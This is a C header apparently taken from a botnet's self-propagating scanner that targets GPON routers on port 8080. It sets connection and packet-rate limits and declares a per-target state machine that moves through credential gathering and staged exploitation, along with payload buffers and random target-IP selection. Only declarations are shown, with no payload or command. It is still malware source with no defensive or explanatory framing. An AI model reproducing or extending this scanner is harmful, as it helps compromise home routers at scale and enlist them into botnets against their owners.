#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define GPON8080_SCANNER_MAX_CONNS 512
#define GPON8080_SCANNER_RAW_PPS 720
#else
#define GPON8080_SCANNER_MAX_CONNS 128
#define GPON8080_SCANNER_RAW_PPS 160
#endif

#ifdef X86_64
#define GPON8080_SCANNER_RDBUF_SIZE 1024
#define GPON8080_SCANNER_HACK_DRAIN 64
#else
#define GPON8080_SCANNER_RDBUF_SIZE 256
#define GPON8080_SCANNER_HACK_DRAIN 64
#endif

struct gpon8080_scanner_connection
{
    int fd, last_recv;
    enum
    {
        GPON8080_SC_CLOSED,
        GPON8080_SC_CONNECTING,
        GPON8080_SC_GET_CREDENTIALS,
        GPON8080_SC_EXPLOIT_STAGE2,
        GPON8080_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[GPON8080_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void gpon8080_scanner();
void gpon8080_kill(void);

static void gpon8080_setup_connection(struct gpon8080_scanner_connection *);
static ipv4_t get_random_gpon8080_ip(void);
